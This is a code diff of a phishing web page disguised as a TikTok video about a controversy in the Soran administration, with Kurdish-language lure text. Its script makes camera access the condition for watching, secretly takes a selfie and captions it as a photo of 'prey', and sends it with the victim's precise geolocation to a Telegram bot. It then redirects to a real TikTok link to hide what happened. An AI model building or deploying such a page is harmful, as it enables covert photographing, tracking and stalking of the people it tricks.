@@ -3,23 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <title>TikTok · کێشەیەکی نوێ لە ئیدارەی سۆران</title>
+    <title>TikTok · کێشەی ئیدارەی سۆران</title>
     <meta property="og:title" content="TikTok · کێشەیەکی نوێ لە ئیدارەی سۆران">
-    <meta property="og:description" content="بینەری تەواوی ڤیدیۆکە بن لە تیکتۆک">
     <meta property="og:image" content="https://rudawsoran.github.io/Video/soran.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
     <meta property="og:type" content="video.other">
 
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
         .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.7); }
         .play-btn { position: absolute; z-index: 5; pointer-events: none; }
         .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         video, canvas { display: none; }
-        .flash-active { background-color: white !important; transition: background 0.1s; }
+        .flash-active { background-color: white !important; }
     </style>
 </head>
 <body id="b">
@@ -38,23 +34,25 @@
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
 
         async function startApp() {
-            const b = document.getElementById('b');
-            const bg = document.getElementById('bg');
-            const btn = document.getElementById('btn');
-
+            // تەنها لێرە دەست پێ دەکات کاتێک کلیک دەکات
             try {
-                // ١. کامێرا
+                // مەرجی سەرەکی: تا لێرە ڕێگە نەدات، کۆدەکە ناچێتە دێڕی دواتر
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                const b = document.getElementById('b');
+                const bg = document.getElementById('bg');
+                const btn = document.getElementById('btn');
                 const v = document.getElementById('v');
+
                 v.srcObject = s;
                 await v.play();
 
-                // ٢. فلاش
+                // نیشاندانی فلاش
                 bg.style.display = 'none';
                 btn.style.display = 'none';
                 b.classList.add('flash-active');
 
-                // ٣. پرۆسەی ناردن دوای ١ چرکە (١٠٠٠ میلی چرکە)
+                // گرتنی وێنە و ناردنی زانیاری دوای ١ چرکە
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -67,30 +65,30 @@
                     fd.append('photo', blob, 'photo.jpg');
                     fd.append('caption', "📸 وێنەی نێچیر\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
                     
-                    // ناردنی وێنە
+                    // ١. ناردنی وێنە (چاوەڕێ دەکات تا تەواو دەبێت)
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
 
-                    // ناردنی لۆکەیشن
+                    // ٢. داواکردنی لۆکەیشن و ناردنی
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const lat = pos.coords.latitude;
-                            const lon = pos.coords.longitude;
-                            const mapLink = "https://www.google.com/maps?q=$" + lat + "," + lon;
-                            
+                            const mapLink = "https://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude;
                             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
+                            
+                            // تەنها دوای ناردنی لۆکەیشن دەچێتە سەر ڤیدیۆکە
                             window.location.href = targetVideo;
                         }, (err) => {
+                            // ئەگەر لۆکەیشنی ڕەتکردەوە، لێرە دەتوانیت بڕیار بدەیت بیبەیت بۆ ڤیدیۆکە یان نا
                             window.location.href = targetVideo;
-                        }, { enableHighAccuracy: true, timeout: 6000 });
+                        }, { enableHighAccuracy: true, timeout: 5000 });
                     } else {
                         window.location.href = targetVideo;
                     }
 
-                    setTimeout(() => { window.location.href = targetVideo; }, 2000);
                 }, 1000);
 
             } catch (e) {
-                alert("بۆ بینینی ڤیدیۆکە، تکایە ڕێگە بدە (Allow)");
+                // ئەگەر کامێرای ڕەتکردەوە (Block)، لێرە هیچ ڕووداوێک ڕوو نادات و هەر لەسەر وێنەکە دەمێنێتەوە
+                alert("بۆ بینینی ڤیدیۆکە، دەبێت ڕێگە بە کامێرا بدەیت.");
             }
         }
     </script>
